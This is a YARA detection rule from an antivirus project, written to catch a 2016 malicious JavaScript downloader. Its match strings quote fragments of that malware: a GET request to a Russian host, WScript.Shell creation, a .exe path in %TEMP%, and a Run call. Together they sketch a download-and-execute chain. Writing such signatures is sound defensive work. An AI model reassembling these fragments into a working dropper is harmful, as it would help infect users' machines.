rule sig_20160330_faa8c715f86ce64ac5c00faf717023ed {
  meta:
    description = "datamaliciousorder - file 20160330_faa8c715f86ce64ac5c00faf717023ed.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9178a56b86ce11e2e0edb790a345ba8bc0d40411f0335fabb2595e1fb2a1f68"

  strings:
    $s1  = "EN[RY](\"GET\", \"http://bigmishki.ru/l3osjf\", false);" fullword ascii
    $s2  = "function Y0(Q0, KW){S = S * 1; return Q0 - KW;};" fullword ascii
    $s3  = "var HZ = function BX() {return WScript[G](\"WScript\"+\".Shell\");}(), Q = 11;" fullword ascii
    $s4  = "if (EN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function X(){return QN + \"\";};" fullword ascii
    $s6  = "function Y() {return HZ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"d22quNTYqRj.ex\" + \"e\";};" fullword ascii
    $s7  = "function R() {return ((KI == true) && (KI == G0)) ? 1 : S;};" fullword ascii
    $s8  = "function L0(A){HZ[\"Run\"](A, S, S);};" fullword ascii
    $s9  = "function L(){return 22;};" fullword ascii
    $s10 = "var N = new this[\"Date\"]();" fullword ascii
    $s11 = "return Y0(XN, KE);" fullword ascii
    $s12 = "function FU()" fullword ascii
    $s13 = "function TN(){return G;};" fullword ascii
    $s14 = "}while (V);" fullword ascii
    $s15 = "function QF(LL) {var UW = (1, 2, 3, 4, 5, LL); return UW;};" fullword ascii
    $s16 = "var T = false;" fullword ascii
    $s17 = "var G0 = false;" fullword ascii
    $s18 = "var KI = false;" fullword ascii
    $s19 = "KI = true; " fullword ascii
    $s20 = "G0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}